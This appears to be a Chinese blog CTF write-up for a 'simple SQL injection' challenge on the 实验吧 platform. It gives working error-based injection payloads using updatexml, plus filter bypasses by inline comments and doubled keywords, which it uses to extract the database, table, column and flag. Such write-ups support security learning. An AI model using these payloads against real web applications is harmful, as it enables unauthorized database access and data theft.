---
title: 实验吧 web writeup
date: 2018-04-18 19:03:31
tags:
---
本篇博客连续更新实验吧的web篇解题思路。
<!--more -->


# 简单的SQL注入

在ID框 输入1，有返回信息。

	ID: 1
	name: baloteli

输入 `'`，报错。

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''''' at line 1

然后输入所有关键字信息，看到底过滤了什么。

```
1 and or union select from where = information_schema table_name table_schema column_name order by information_schema.tables --+ /**/ // # %00
```

得到信息：

	ID: 1 or   = information_schema table_name information_schema.tables    /**/ //

看来屏蔽了不少关键字。

对于过滤，可以考虑 `内联注释`、`双重关键字` 、 `大小写混用` 、 `编码` 。

`大小写混用` 不好使。


这里尝试注入 `1' or '1'='1`，得到正常信息，怀疑sql语句为：
```
select * from xx where id='xxx'
```

## 采用 `报错注入` + `内联注释` 方式。

### 内联注释

采用 `/*! code */` 来执行我们的SQL语句。


比如一个过滤器过滤了：
```
union,where, table_name, table_schema, =, and information_schema
```

这些都是我们内联注释需要绕过的目标。所以通常利用内联注释进行如下方式绕过：
```
id=1/*!UnIoN*/+SeLeCT+1,2,concat(/*!table_name*/)+FrOM /*information_schema*/.tables /*!WHERE */+/*!TaBlE_ScHeMa*/+like+database()-- -
```

这里我们需要的语句是
```
1' or updatexml(1,concat('~',(select database() LIMIT 0,1),'~'),3) or '1'='1  
```

```
1' or updatexml(1,concat('~',(/*!select*/ database() LIMIT 0,1),'~'),3) or '1'='1  
```

得到反馈信息：

	XPATH syntax error: '~web1~'


查表名字：

```
1'or updatexml(1,concat('~',(select table_name from information_schema.tables where table_schema='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

这里报错了！

	You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '='web1' limit 0,1),'~'),3) or '1'='1'' at line 1

明明在前面的验证中， `table_schema` 是被过滤的呀，添加了内联注释也不行？

在尝试了`1 /*!table_schema*/` 之后发现，果然被过滤掉了。

那采取 `双重关键字` 。 `table_schema` 换成 `table_schtable_schemaema`

输入 `1 table_schtable_schemaema` 得到 `>ID: 1  table_schema`。很好。

```
1'or updatexml(1,concat('~',(/*!select*/  table_name  /*!from*/ information_schema.tables /*!where*/ /*!table_schtable_schemaema*/='web1' LIMIT 0,1),'~'),3) or '1'='1 
```

拿到表格

	XPATH syntax error: '~flag~'

之后继续拿字段。
```
1'or updatexml(1,concat('~',(/*!select*/  column_name /*!from*/ information_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

输入后，发现 `column_name` 、 `information_schema.columns` 都被过滤了，好奇怪。拿只好用 `双重关键字` 方法了。
```
1'or updatexml(1,concat('~',(/*!select*/  colucolumn_namemn_name  /*!from*/ infinformation_schema.columnsormation_schema.columns /*!where*/ table_name='flag' LIMIT 0,1),'~'),3) or '1'='1  
```

	XPATH syntax error: '~flag~'
得到表的字段：`flag`, `id`

直接获取 `flag`:

```
1'or updatexml(1,concat('~',(/*!select*/  flag  /*!from*/ flag LIMIT 0,1),'~'),3) or '1'='1
```

	XPATH syntax error: '~flag{Y0u_@r3_5O_dAmn_90Od}~'


## `双重关键字`



